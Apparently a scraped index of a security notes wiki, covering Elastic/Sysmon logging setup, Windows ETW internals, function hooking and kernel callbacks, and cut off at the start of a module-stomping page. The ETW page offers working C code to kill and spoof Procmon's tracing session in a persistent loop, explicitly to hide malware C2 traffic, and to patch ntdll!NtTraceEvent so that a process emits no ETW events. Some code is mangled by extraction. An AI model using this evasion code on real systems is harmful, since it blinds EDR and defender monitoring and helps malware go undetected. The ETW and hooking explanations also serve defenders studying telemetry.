The device should be enrolled ! Check if any datastream have been defined in Kibana : If no datastream are defined there is a communication problem between the agent and the elasticsearch. Check the log directory in the machine where the agent has been installed and the logs in the elasticsearch server (/var/log/elasticsearch/elasticsearch.log). Usually it is a TLS certificate problem. Add the EDR Go to the Fleet agent policy: Add an integration with Endpoint And Cloud Security: Go to Security > Rules and enable all rules: Add Sysmon Sysmon Download and install sysmon: Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip Expand-Archive .\\Sysmon.zip -DestinationPath . Invoke-WebRequest -Uri https://github.com/SwiftOnSecurity/sysmon-config -OutFile ./sysmonconfig.xml .\\Sysmon.exe -accepteula -i .\\sysmonconfig.xml Winlogbeats Winlogbeats is used to send Sysmon logs to the elastic stack. Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-7.10.0-windows-x86_64.zip -OutFile winlogbeat-7.10.0-windows-x86_64.zip Expand-Archive .\\winlogbeat-7.10.0-windows-x86_64.zip -DestinationPath . mv .\\winlogbeat-7.10.0-windows-x86_64 'C:\\Program Files\\winlogbeat' cd 'C:\\Program Files\\winlogbeat\\' Open or create the winlogbeat.yml file and add : winlogbeat.event_logs: - name: Application ignore_older: 72h - name: System - name: Microsoft-Windows-Windows Defender/Operational - name: Microsoft-Windows-Windows Firewall With Advanced Security/Firewall - name: Security processors: - script: lang: javascript id: security file: ${path.home}/module/security/config/winlogbeat-security.js - name: Microsoft-Windows-Sysmon/Operational processors: - script: lang: javascript id: sysmon file: ${path.home}/module/sysmon/config/winlogbeat-sysmon.js - name: Windows PowerShell event_id: 400, 403, 600, 800 processors: - script: lang: javascript id: powershell file: ${path.home}/module/powershell/config/winlogbeat-powershell.js - name: Microsoft-Windows-PowerShell/Operational event_id: 4103, 4104, 4105, 4106 processors: - script: lang: javascript id: powershell file: ${path.home}/module/powershell/config/winlogbeat-powershell.js - name: ForwardedEvents tags: [forwarded] processors: - script: when.equals.winlog.channel: Security lang: javascript id: security file: ${path.home}/module/security/config/winlogbeat-security.js - script: when.equals.winlog.channel: Microsoft-Windows-Sysmon/Operational lang: javascript id: sysmon file: ${path.home}/module/sysmon/config/winlogbeat-sysmon.js - script: when.equals.winlog.channel: Windows PowerShell lang: javascript id: powershell file: ${path.home}/module/powershell/config/winlogbeat-powershell.js - script: when.equals.winlog.channel: Microsoft-Windows-PowerShell/Operational lang: javascript id: powershell file: ${path.home}/module/powershell/config/winlogbeat-powershell.js - name: Microsoft-Windows-WMI-Activity/Operational event_id: 5857,5858,5859,5860,5861 setup.template.settings: index.number_of_shards: 1 setup.kibana: host: \"192.168.253.18\" output.elasticsearch: # Array of hosts to connect to. hosts: [\"192.168.253.18:9200\"] username: \"${username}\" password: \"${password}\" protocol: \"https\" processors: - add_host_metadata: when.not.contains.tags: forwarded - add_cloud_metadata: ~ Initial configuration: winlogbeat.exe setup -e Install the service : powershell -Exec bypass -File .\\install-service-winlogbeat.ps1 Set-Service -Name \"winlogbeat\" -StartupType automatic Start-Service -Name \"winlogbeat\" Get-Service -Name \"winlogbeat\" "},"Malware/ETW.html":{"url":"Malware/ETW.html","title":"ETW","keywords":"","body":"ETW Table of content Overview Logman Providers List providers Inspect Providers Tracing sessions List tracing sessions Inspect tracing sessions Use tracing sessions SilkETW Procmon Blinding Procmon Automating the process Detect Procmon tracing session Kill Procmon tracing session Create a new tracing session Make it persistent Limits Patching ETW Writing event to a provider Finding the API Patch the DLL Limits Overview The Event Tracing for Windows or ETW is the mechanism used by Windows to log system events. ETW are designed through a provider/consumer concept. The different process write their events in the providers and the consumers can access to these events through the providers. Several antivirus or EDR solutions such as Microsoft ATP heavily use these events to monitor the system. The ETW events can be raised by the kernel but also by some userland functions. For example, when performing a simple HTTP request to use the WinHTTP API, an event is raised by the WinHttpSendRequest function on userland, but another event is also raised by the kernel when the connection is bound at the OS level. While removing userland events can be quite easy, tackling down kernel events can be more challenging. Logman Windows provides a built-in tool to access to the ETW tracing sessions: logman. This tool can be used to create, inspect and modify tracing sessions, inspect the different providers and other interesting things. Providers The providers are the first stage of the ETW workflow. They are used to collect and categorize events generated by the different processes. List providers The different providers can be listed using the following lgoman command: logman query providers # Provider GUID # ------------------------------------------------------------------------------- # _802dot1X {1B243C08-ABC2-C043-37FD-A730D9E8E45C} # ACPI Driver Trace Provider {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B} # Active Directory Domain Services: SAM {8E598056-8993-11D2-819E-0000F875A064} # Active Directory: Kerberos Client {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4} # Active Directory: NetLogon {F33959B4-DBEC-11D2-895B-00C04F79AB69} # ADODB.1 {04C8A86F-3369-12F8-4769-24E484A9E725} # ADOMD.1 {7EA56435-3F2F-3F63-A829-F0B35B5CAD41} # Application Popup {47BFA2B7-BD54-4FAC-B70B-29021084CA8F} # Application-Addon-Event-Provider {A83FA99F-C356-4DED-9FD6-5A5EB8546D68} # ATA Port Driver Tracing Provider {D08BD885-501E-489A-BAC6-B7D24BFE6BBF} # AuthFw NetShell Plugin {935F4AE6-845D-41C6-97FA-380DAD429B72} # ... As you can see, there are a lot of providers. Each provider is \"specialized\" in some types of events (such as the Microsoft-Windows-WinHTTP) but some other can compile several types of events such as the Windows Kernel Trace that compile event raised by kernel functions such as VirtualAlloc or CreateProcess. Inspect Providers If you want to retrieve a specific type of event, it could be quite challenging as the providers dumped by logman do not show the event they are channeling. However, logman can be used to inspect the different providers and extract the events they provide. logman query providers \"Microsoft-Windows-WinHTTP\" Provider GUID ------------------------------------------------------------------------------- Microsoft-Windows-WinHttp {7D44233D-3055-4B9C-BA64-0D47CA40A232} # Value Keyword Description # ------------------------------------------------------------------------------- # 0x0000000000000001 Keyword.API API # 0x0000000000000020 WINHTTP_KEYWORD_AUTOPROXY Flagged on all WinHTTP events dealing with AUTOPROXY # 0x0000000100000000 Keyword.SEND SEND # 0x0000000200000000 Keyword.RECEIVE RECEIVE # 0x0000000400000000 Keyword.L3_CONNECT L3_CONNECT # 0x0000001000000000 Keyword.CLOSE CLOSE # 0x0000002000000000 Keyword.SECURITY SECURITY # 0x0000004000000000 Keyword.CONFIGURATION CONFIGURATION # 0x0000008000000000 Keyword.GLOBAL GLOBAL # 0x0000010000000000 Keyword.DROPPED DROPPED # 0x0000020000000000 Keyword.PII_PRESENT PII_PRESENT # 0x0000040000000000 Keyword.PACKET PACKET # 0x0000080000000000 Keyword.ADDRESS ADDRESS # 0x0000100000000000 Keyword.CONTEXT_EVENT CONTEXT_EVENT # 0x0000200000000000 Keyword.STATE_TRANSITION STATE_TRANSITION # 0x0001000000000000 win:ResponseTime Response Time # 0x0080000000000000 win:EventlogClassic Classic # 0x8000000000000000 Microsoft-Windows-WinHttp/Diagnostic # 0x4000000000000000 Microsoft-Windows-WinHTTP-NDF/Diagnostic # ... Likewise, this command dumps the different event keys logged by the provider and several other information such as the verbosity level or the different processes that provide events to this provider. However, it is not possible to retrieve more information about the events as they are usually not documented and it is one of the most important problem with ETW for defenders. Tracing sessions As explained in the ETW workflow, the providers collect events raised by processes and tracing sessions will retrieve these events from the providers. The tracing sessions can be seen as a collection of events coming from different chosen providers. For example, if you want to only retrieve event raised by memory allocation and HTTP connections, you will not be able to find one provider that collects these two types of events. However, you can create a tracing session fed by the Windows Kernel Tracing and the Microsoft-Windows-WinHTTP provider that will give you the two types of events you want. Tracing sessions can be seen as a personal collection of events. List tracing sessions Logman can be used to display the active tracing sessions: logman query -ets # Data Collector Set Type Status # ------------------------------------------------------------------------------- # Circular Kernel Context Logger Trace Running # Eventlog-Security Trace Running # DiagLog Trace Running # Diagtrack-Listener Trace Running # EventLog-Application Trace Running # EventLog-System Trace Running # iclsClient Trace Running # ... Inspect tracing sessions The different tracing sessions are linked to providers. It is possible to inspect the providers queried by each tracing session with the following logman command: logman query iclsClient -ets # Name: iclsClient # Status: Running # Root Path: C:\\Windows\\System32\\LogFiles\\WMI\\Intel\\iCLSClient # Segment: Off # Schedules: On # Segment Max Size: 40 MB # # Name: iclsClient\\iclsClient # Type: Trace # Output Location: C:\\Windows\\System32\\LogFiles\\WMI\\Intel\\iCLSClient\\iclsClient.etl.013 # Append: Off # Circular: On # Overwrite: Off # Buffer Size: 4 # Buffers Lost: 0 # Buffers Written: 23 # Buffer Flush Timer: 2 # Clock Type: Performance # File Mode: File # # Provider: # Name: Intel-Autologger-iclsClient # Provider Guid: {B8D7E9A0-65D5-40BE-AFEA-83593FC0164E} # Level: 255 # KeywordsAll: 0x0 # KeywordsAny: 0xffffffffffffffff # Properties: 64 # Filter Type: 0 Use tracing sessions The following command can be used to start a tracing session logman create trace ${tracingSessionName} -ets Once the session is created, some providers must be added using the following command : logman update ${tracingSessionName} -p ${providerName} ${eventValue} -ets Likewise, a provider can be removed using the following command: logman update trace ${tracingSessionName} --p ${providerName} ${eventValue} -ets The tracing session can be stopped using : logman stop spotless-tracing -ets The tracing session creates an etl file that can be viewed with Event Viewer. SilkETW SilkETW is a tool allowing simple access to ETW events. Indeed, even if logman is quite interesting to inspect providers and tracing sessions, it is not really flexible and easy to use. Moreover, logman can be resource consuming as it logs events system wide. SilkETW can be used to access to a specific provider and retrieve events either from userland or kerneland providers. The tool will connect to a specific provider and dump the event in a file JSON formatted that can be easily displayed using a simple text editor. For example, the following JSON represents an event raised by the kernel during a VirtualAlloc execution: { \"ProviderGuid\": \"9e814aad-3204-11d2-9a82-006008a86939\", \"YaraMatch\": [], \"ProviderName\": \"MSNT_SystemTrace\", \"EventName\": \"PageFault/VirtualAlloc\", \"Opcode\": 98, \"OpcodeName\": \"VirtualAlloc\", \"TimeStamp\": \"2022-09-08T14:30:15.9588384+02:00\", \"ThreadID\": 37036, \"ProcessID\": 35088, \"ProcessName\": \"HTTP\", \"PointerSize\": 8, \"EventDataLength\": 24, \"XmlEventData\": { \"ProviderName\": \"MSNT_SystemTrace\", \"ProcessId\": \"35,088\", \"EventName\": \"PageFault/VirtualAlloc\", \"PID\": \"35088\", \"Flags\": \"12,288\", \"TID\": \"37036\", \"BaseAddress\": \"0x1094a030000\", \"RegionSize\": \"0x1000\", \"MSec\": \"10155.6890\", \"PName\": \"HTTP\" } } The Github documentation is well written and contains all the information needed to use the tool. Procmon Procmon is a tool from the SysInternal Suite that allows monitoring events system wide. In order to catch events, Procmon leverage the following techniques: System minifilters Registry minifilters Process and thread callback ETW for network events Blinding Procmon For some events such as the TCP connections, Procmon use the ETW events. Indeed, when using logman with Procmon launched, the Procmon Event Tracing Session can be found: logman query -ets | Select-String PROCMON # PROCMON TRACE Trace Running The goal is to be able to remove TCP and UDP entries from a Procmon tracing session. The Pocmon tracing session can be easily stopped using logman : logman stop \"PROCMON TRACE\" -ets Once the session is stopped, Procmon is not able to log network events anymore as it only uses ETW to collect these events. Automating the process Using logman to blind Procmon is a nice proof of concept, however, a simple restart of Procmon fixes the problem as the session is restarted by the software. The idea now is to be able to permanently blind Procmon. A use case is a malware performing network connection with a remote C2. Blinding Procmon will make the malware reversing less obvious. Indeed, there are several other tools that can be used to detect network connections performed, but it is a first step and as said before, a simnple proof of concept on ETW vulnerabilties. When Procmon is launched, it will automatically create a tracing session named PROCMON TRACE. this session is automatically killed when Procmon is closed. Thus, the idea is to list the different tracing session, and when a Procmon tracing session is found, the program will kill it and recreate a new one not linked to any provider. As the new tracing session will not be linked to any provider, it will not forward any events to Procmon. The Win32 API contains several functions to play with ETW tracing sessions: StartTrace: start a new tracing session StopTrace and ControlTrace : stop a given tracing session QueryTrace : retrieve the settings, properties and statistics of a tracing session QueryAllTrace : retrieve the settings, properties and statistics of all active tracing session PEVENT_TRACE_PROPERTIES : object used to store trace properties and statistics Detect Procmon tracing session First of all, an array of PEVENT_TRACE_PROPERTIES objects must be initialized: // By default, Windows does not support more than 64 parallele tracing sessions #define MAXIMUM_LOGGERS 64 #define MAXSTR 1024 // Array containing all tracing sessions PEVENT_TRACE_PROPERTIES tracingSessions[MAXIMUM_LOGGERS]; // Object representing a single tracing session ULONG SizeForOneProperty = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR); ULONG SizeNeeded = MAXIMUM_LOGGERS * SizeForOneProperty; PEVENT_TRACE_PROPERTIES singleTracingSession = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded); // Initializing tracingSessions internal structures for (size_t LoggerCounter = 0; LoggerCounter Wnode.BufferSize = SizeForOneProperty; singleTracingSession->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES); singleTracingSession->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + MAXSTR * sizeof(TCHAR); // Set the value in the global tracing session array tracingSessions[LoggerCounter] = singleTracingSession; // Jump to the next tracing session to initialize singleTracingSession = (PEVENT_TRACE_PROPERTIES)((PUCHAR)singleTracingSession + singleTracingSession->Wnode.BufferSize); } Now the array tracingSessions is initialized, it can be populated using the Win32 API: // Fill the tracingSessions array with all active sessions information ULONG numberOfTracingSessions; Status = QueryAllTraces( tracingSessions, MAXIMUM_LOGGERS, &numberOfTracingSessions ); From now, the tracingSessions object contains at least the name of all active tracing sessions accessible to the process. Indeed, some tracing sessions can only be accessed by a high integrity process. Let’s find the Procmon tracing session: // variable containing the tracing session name LPTSTR sessionName; for(size_t tracingCount; tracingCount LoggerNameOffset > 0) && (tracingSessions[tracingCount]->LoggerNameOffset Wnode.BufferSize)) { sessionName = (LPTSTR)((PUCHAR)tracingSessions[tracingCount] + tracingSessions[tracingCount]->LoggerNameOffset); } else { sessionName = NULL; } // Check if it is the Procmon tracing session if(_tcscmp(sessionName, L\"PROCMON_TRACE\")){ // start the attack PEVENT_TRACE_PROPERTIES procmonTracingSession = tracingSessions[tracingCount]; ... break; } } Now the Procmon tracing session is found, let’s run the attack ! Kill Procmon tracing session The first thing to do is to kill the Procmon tracing session: ULONG status = StopTraceW((TRACEHANDLE)NULL, L\"PROCMON TRACE\", procmonTracingSession); And that's it... The StopTraceW Win32 API will do all the work and kill the tracing session. Just check the returned status to verify nothing goes wrong. At this moment Procmon should not be able to monitor network events anymore. Let’s create a fake tracing session mimicking the Procmon legit tracing session. Create a new tracing session First of all, a PEVENT_TRACE_PROPERTIES object must be initialized as shown in the first part: // Size allocated in the property object ULONG SizeNeeded = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR); // Object handling the tracing session properties PEVENT_TRACE_PROPERTIES newTracingSession = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded); RtlZeroMemory(newTracingSession, SizeNeeded); newTracingSession->Wnode.BufferSize = SizeNeeded; // Set the same expected `GUID` GUID procMonGuid = { 0x75955553, 0x2055, 0x11ED, { 0xA6, 0x4B, 0x78, 0x2B, 0x46, 0x20, 0x15, 0xF6 } } newTracingSession->Wnode.Guid = procMonGuid; // This information can be extracted using logman on the legit Procmon tracing session newTracingSession->Wnode.ClientContext = 1; newTracingSession->Wnode.Flags = EVENT_TRACE_FLAG_IMAGE_LOAD; newTracingSession->LogFileMode = EVENT_TRACE_FILE_MODE_SEQUENTIAL; newTracingSession->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES); newTracingSession->LogFileNameOffset = newTracingSession->LoggerNameOffset + MAXSTR * sizeof(TCHAR); newTracingSession->MaximumBuffers = 54; tracingSessionName = (LPTSTR)((PCHAR)newTracingSession + newTracingSession->LoggerNameOffset); logFileName = (LPTSTR)((PCHAR)newTracingSession + newTracingSession->LogFileNameOffset); // Set the tracing session name and the log storing path _tcscpy_s(logFileName, MAXSTR, _T(\"C:\\\\LogFile.Etl\")); _tcscpy_s(tracingSessionName, MAXSTR, L\"PROCMON_TRACE\"); The tracing session object is initialized. Let’s register this new tracing session using the Win32 API: TRACEHANDLE tracingSessionHandle = 0; ULONG status = StartTraceW(&tracingSessionHandle, tracingSessionName, newTracingSession); And that's it. The StartTraceW Win32 API will handle everything and start the tracing session. Make it persistent If you try the previous code, it will do the same thing that what have been done using logman thus, any Procmon restart will erase the modification and re-allows it to monitor network events. In order to make the change persistent, it is possible to loop the whole attack: // pseudo code while(1){ // Check if any procmon tracing session exist if(!isActiveProcmonTracingSession){ sleep(2000); continue; } // Retrieve the procmon tracing session procmonTracingSession = getProcmonTracingSession(); // Stop it stopProcmonTracingSession(procmonTracingSession); // Create a fake one createNewProcmonTracingSession(procmonTracingSession); // Wait until the fake one is deleted by procmon waitUntilProcmonSessionExists(); } Limits This attack is interesting to understand how ETW can be used by software (such as EDR) to monitor processes execution through ETW and how malwares can try to evade ETW monitoring by tampering tracing sessions established. The problem with ETW is that tracing sessions are global among the system and the modification performed by a given userland process could impact the whole detection mechanism system wide. However, several protection can be set up to avoid tracing session tampering by unprivileged process. Indeed, some tracing session and providers can only be registered or updated by Protected Process Light or PPL processes. A good example is Defender ATP tracing sessions and providers. Even a high integrity process is not able to tamper the Defender tracing session. Of course, PPL limitation is not fully secured as driver code or exploit could allow a malicious process to bypass the security but it is a start. Patching ETW The previous technique, focusing Procmon tracing session, leverages the fact that tracing sessions can be tampered by any process with the necessary privileges to access to the tracing session. The following technique will not tamper the tracing sessions but the way a process reports events to the providers. Indeed, the events are raised by the different processes and written in the providers. If the process is unable to write a new event in the providers, the security applications such as EDR cannot retrieve and analyze these events. Writing event to a provider The idea is to patch the Win32 API used to write event on the provider. It is maybe possible to retrieve the Win32 API through documentation, but as everyone knows, 3 hours of debugging can avoid 15 minutes reading documentation. Thus let’s drop Microsoft documentation and fire up the debugger. Finding the API In order to find the API responsible for event writing, let’s use a simple code that generates an easy-to-catch event. Using logman the following provider is found: Microsoft-Windows-WinHttp {7D44233D-3055-4B9C-BA64-0D47CA40A232} This provider is interesting as it is only used when WinHTTP API is used. Then, a simple code sending an HTTP request using the WinHTTP API: #include #include #include #pragma comment(lib, \"winhttp.lib\") int main(void) { DWORD dwSize = 0; DWORD dwDownloaded = 0; LPSTR pszOutBuffer; BOOL bResults = FALSE; HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL; // Use WinHttpOpen to obtain a session handle. hSession = WinHttpOpen(L\"WinHTTP Example/1.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); // Specify an HTTP server. if (hSession) hConnect = WinHttpConnect(hSession, L\"www.microsoft.com\", INTERNET_DEFAULT_HTTPS_PORT, 0); // Create an HTTP request handle. if (hConnect) hRequest = WinHttpOpenRequest(hConnect, L\"GET\", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE); // Send a request. if (hRequest) bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); // End the request. if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL); // Keep checking for data until there is nothing left. if (bResults) { do { // Check for available data. dwSize = 0; if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) printf(\"Error %u in WinHttpQueryDataAvailable.\\n\", GetLastError()); // Allocate space for the buffer. pszOutBuffer = new char[dwSize + 1]; if (!pszOutBuffer) { printf(\"Out of memory\\n\"); dwSize = 0; } else { // Read the data. ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) printf(\"Error %u in WinHttpReadData.\\n\", GetLastError()); else printf(\"%s\", pszOutBuffer); // Free the memory allocated to the buffer. delete[] pszOutBuffer; } } while (dwSize > 0); } // Report any errors. if (!bResults) printf(\"Error %d has occurred.\\n\", GetLastError()); // Close any open handles. if (hRequest) WinHttpCloseHandle(hRequest); if (hConnect) WinHttpCloseHandle(hConnect); if (hSession) WinHttpCloseHandle(hSession); return 0; } Finally, SilkETW is used to monitor the provider: .\\SilkETW.exe -t user -pn Microsoft-Windows-WinHttp -ot file -p ./event.txt The logfile written by SilkETW is JSON formatted and contains the Process ID it is thus easy to verify the event logged has been raised by our process or by another application running on the system. Once SilkETW is launched and the test program compiled, let’s run it to verify if an event is raised. You should see between 2 and 4 events raised. The test program will raise these events each time it is run. Let’s go step by step. First, try to identify which function raises an event. Set some system(\"PAUSE\") before each function and wait for an event to be raised. For example, the function WinHttpSendRequest will raise a single event. Let’s use this function for the next investigations. Once the function is found, we will use a debugger to follow the call stack until an event is raised. The idea is to run the debugger until a call raise an event. Inside the WINHTTP!WinHttpSendRequest function, the following line raises the event: Thus, the program is restarted, a breakpoint is set in the function WINHTTP!WinHttpSendRequest and the code is debugged until a new event is raised. After iterating this process several times, the following call stack is found: WINHTTP.dll ========================================================== HTTP_USER_REQUEST::SendRequest HTTP_USER_REQUEST::_SendRequestWithDrainComplete HTTP_USER_REQUEST::_CallGetProxyForUrl WxGetProxyContext::StartProxyResolve WxProxyManager::OnProcessGetProxyForUrl WinHttpClientCompletion::StartProxyResolve WinHttpClientResolver::GetProxyForUrlImpl WinHttpClientCompletion::OnProxyResolved WinHttpClientCompletion::StateStart McTemplateU0q_EventWriteTransfer McGenEventWrite_EventWriteTransfer NTDLL.dll ========================================================== ntdll!EtwEventWriteTransfer ntdll!EtwpEventWriteFull ntdll!NtTraceEvent SYSCALL This callstack shows that the function EtwEventWriteFull is the Win32 API used to write an event in the provider when using the WinHTTP API. In fact, this API is used by every userland process. This is convenient as there is a single API to write events and it is located in the NTDLL.DLL. Thus, this function can be patched to avoid process writing event in the providers. Patch the DLL Now we know which function is used to write events in the providers, let’s patch it to avoid any event written by the process. The patch will be a simple ret added at the beginning of ntdll!NtTraceEvent. The following code can be used to apply the patch: void patchETW() { // Retrieve the function to patch PVOID NtTraceEvent = GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtTraceEvent\"); DWORD dwOld; // Simple patch representing the ret instruction DWORD retPatch = 0xc3; // Modify page protection to be able to write the patch // PAGE_EXECUTE_READWRITE is mandatory as the function is often used VirtualProtect((LPVOID)((DWORD64)NtTraceEvent), 1, PAGE_EXECUTE_READWRITE, &dwOld); // Write the patch CopyMemory((LPVOID)((DWORD64)NtTraceEvent), &retPatch, 1); // Reprotect the page as PAGE_EXECUTE_READ VirtualProtect((LPVOID)((DWORD64)NtTraceEvent), 1, dwOld, &dwOld); } Once the patch is applied, the modification can be analyzed in Windbg: Finally, the program is relaunched without debugger and the events are monitored using SilkETW. If the patch has been successfully implemented, no event should be monitored by SilkETW. Limits Patching the NtTraceEvent function is a quick way to deactivate ETW events raised by the process. However, as the NTDLL.dll is patched, any EDR performing integrity check will raise an alert. Likewise, in order to patch the API, the page protection is set as PAGE_EXECUTE_READWRITE during the patch writing, an EDR could find the action suspicious and raise an alert. However, the most important limit is that this attack will only patch event raised in usermode. Indeed, every event raised by kernel functions such as VirtualAlloc or network primitives cannot be avoided with this technique. Indeed, if you patch the ETW with this technique and you launch Procmon, it will still log the TCP connections performed as it uses ETW events raised by the kernel only. In order to fully patch ETW a driver must be used. Fortunately, ETW structures are not monitored by KPP and can be patched without triggering a BSOD. But this will be a part of another blogpost... "},"Malware/Function hooking.html":{"url":"Malware/Function hooking.html","title":"Function Hooking","keywords":"","body":"Function Hooking Table of content Definition Hook example x86 : Add JMP patch x86 : NtSetProcessInformation - Hook syscall results Resource Definition A hook is a callback added to a method that will redirect program execution flow. For example, EDR can add hooks to sensitive functions to check the different parameters used. The hook can be implemented easily with a JMP added at the beginning of the function or through specific callback functions such as NtSetProcessInformation. Hook example x86 : Add JMP patch The following x86 code hooks the MessageBoxA function and redirect the execution flow to another function: #include #include #define BYTES_REQUIRED 6 // Function where the execution flow will be redirected int __stdcall HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ printf(\"\\n[ HOOKED MESSAGEBOXA ]\\n\"); printf(\"Arguments:\\n\"); printf(\" 1. lpText: %s\\n\", lpText); printf(\" 2. lpCaption: %s\\n\", lpCaption); printf(\" 3. uType: %ld\\n\", uType); return 1; } int main() { SIZE_T lpNumberOfBytesRead = 0; HMODULE hModule = NULL; FARPROC pMessageBoxAFunc = NULL; char pMessageBoxABytes[BYTES_REQUIRED]; void* pHookedMessageBoxFunc = &HookedMessageBoxA; hModule = LoadLibraryA(\"user32.dll\"); if (!hModule){ return -1; } pMessageBoxAFunc = GetProcAddress(hModule, \"MessageBoxA\"); if (ReadProcessMemory(GetCurrentProcess(), pMessageBoxAFunc, pMessageBoxABytes, BYTES_REQUIRED, &lpNumberOfBytesRead) == FALSE){ printf(\"[!] ReadProcessMemory: %ld\\n\", GetLastError()); return -1; } // Add the hook : // JMP HookedMessageBoxFunc // RET char patch[BYTES_REQUIRED] = { 0 }; // JMP OPCODE memcpy_s(patch, 1, \"\\x68\", 1); // Function address where the execution flow will be redirect memcpy_s(patch + 1, 4, &pHookedMessageBoxFunc, 4); // RET OPCODE memcpy_s(patch + 5, 1, \"\\xC3\", 1); // Write the patch if (WriteProcessMemory(GetCurrentProcess(), (LPVOID)pMessageBoxAFunc, patch, sizeof(patch), &lpNumberOfBytesRead) == FALSE){ printf(\"[!] WriteProcessMemory: %ld\\n\", GetLastError()); return -1; } // Call the hooked function MessageBoxA(NULL, \"AAAAA\", \"BBBBB\", MB_OK); return 0; } /* Result : [ HOOKED MESSAGEBOXA ] -> Arguments: 1. lpText: AAAAA 2. lpCaption: BBBBB 3. uType: 0 */ For x64 the patch's OPCODE must be changed x86 : NtSetProcessInformation - Hook syscall results The NtSetProcessInformation is called every time the kernel sent back a value to the usermode. When a syscall is performed, the kernel send back the result to the usermode function and call the NtSetProcessInformation function first. The NtSetProcessInformation takes as an argument a function pointer used as a callback function. Thus, this function will be executed each time the kernel communicates with the usermode. It then can be used to intercept any system calls performed, any process or thread created etc... Before calling the callback, the registers must be saved in the stack. Then the callback function is called and the registers are popped out from the stack. this this for more explanations. R10 contains the last instruction pointer. When the callback is finished, just jump to R10 to continue the normal execution flow. This is summarized in the following ASM code : include ksamd64.inc ; the callback function that will be called and defined in the C file EXTERN hook:NEAR .code medium PROC ; https://docs.microsoft.com/en-us/cpp/build/caller-callee-saved-registers push rax ; return value if system call push rcx push RBX push RBP push RDI push RSI push RSP push R12 push R13 push R14 push R15 ; allocate stack sub rsp, 1000h ; set parameters for the hook function mov rdx, rax mov rcx, r10 ; call the hook function call hook ; erase the allocated stack add rsp, 1000h ; repop registers pop R15 pop R14 pop R13 pop R12 pop RSP pop RSI pop RDI pop RBP pop RBX pop rcx pop rax ; jump to the normal execution flow jmp R10 medium ENDP END Resource Nirvana Hooking : https://www.youtube.com/watch?v=pHyWyH804xE "},"Malware/Kernel callback.html":{"url":"Malware/Kernel callback.html","title":"Kernel Callback","keywords":"","body":"Kernel Callback Table of content Introduction Callback message examples Sysmon Windows functions Ressource Introduction The kernel's callback mechanism provides a general way for drivers to request and provide notification when certain conditions are satisfied. Kernel callbacks allow drivers to be notified for specific events. The driver can register a callback”in its code for any supported action. It will then receive a pre or post notification when the targeted action is performed. However callbacks will not perform any modification to the underlying Windows Kernel thus, avoiding any BSOD due to KPP. The driver can register to an event list through the Win32 API such as the PsSetLoadImageNotifyRoutine. This specific API allows a driver to be notified whenever an image such as a DLL or an EXE has been loaded. In the following example, the function ObRegisterCallback is used to define two callbacks (PreoperationCallback and PostOperationCallback) to stop the creation of the notepad.exe process. EDR usually do not use this method but it is a good example of how kernel callbacks can be used. Callback message examples For example, the following code : #include #include int main() { HMODULE hModule = LoadLibraryA(\"winhttp.dll\"); printf(\"WinHTTP: 0x%p\\n\", hModule); return 0; } An event is generated by the kernel and caught with PsSetLoadImageNotifyRoutine: Image loaded: RuleName: - UtcTime: 2022-04-29 18:50:10.780 ProcessGuid: {3ebcda8b-3362-626c-a200-000000004f00} ProcessId: 6716 Image: C:\\Users\\admin\\Desktop\\main.exe ImageLoaded: C:\\Windows\\System32\\winhttp.dll FileVersion: 10.0.19041.1620 (WinBuild.160101.0800) Description: Windows HTTP Services Product: Microsoft® Windows® Operating System Company: Microsoft Corporation OriginalFileName: winhttp.dll Hashes: SHA1=4F2A9BB575D38DBDC8DBB25A82BDF1AC0C41E78C,MD5=FB2B6347C25118C3AE19E9903C85B451,SHA256=989B2DFD70526098366AB722865C71643181F9DCB8E7954DA643AA4A84F3EBF0,IMPHASH=0597CE736881E784CC576C58367E6FEA Signed: true Signature: Microsoft Windows SignatureStatus: Valid User: PUNCTURE\\admin Sysmon Sysmon is a tool from the SysInternals Suite that can be used to collect several event types generated by the Kernel. Sysmon will create a service and install the SysmonSys driver. A configuration file is needed during the Sysmon installation: md5,sha256,IMPHASH KernelCallbacks.exe This configuration file will only monitor ImageLoad events (events raised by LoadLibrary). The Sysmon driver can be installed with : Sysmon.exe -i ${configFile} And uninstall with : Sysmon.exe -u The Sysmon event can be analyzed with the Windows Event Viewer : Aplications and Services > Microsoft > Sysmon Windows functions Notification routine Description PsSetCreateProcessNotifyRoutine Register a callback that is notified when a new process is created or deleted. It can be used to prevent process creation or termination PsSetCreateThreadNotifyRoutine Register a callback that is notified when a new process is created or deleted. It can be used to prevent thread creation or termination PsSetLoadNotifyRoutine Register a callback that is notified when a new image is loaded or mapped in memory. It can be used to prevent DLL remapping used to remove user-mode hooks. ObRegisterCallbacks Register a list of callback routine for thread, process and desktop handle operation. It can be used to filter permission on call to OpenProcess, OpenThread and DuplicateHandle Ressource https://pre.empt.dev/posts/maelstrom-edr-kernel-callbacks-hooks-and-callstacks/#Kernel_Callbacks "},"Malware/Module stomping.html":{"url":"Malware/Module stomping.html","title":"Module Stomping","keywords":"","body":"Module Stomping Table of content Overview Hands on Inject the DLL Find the DLL load address Find the DLL entrypoint address Write and launch the shellcode Final exploit Overview Inject a legit DLL and 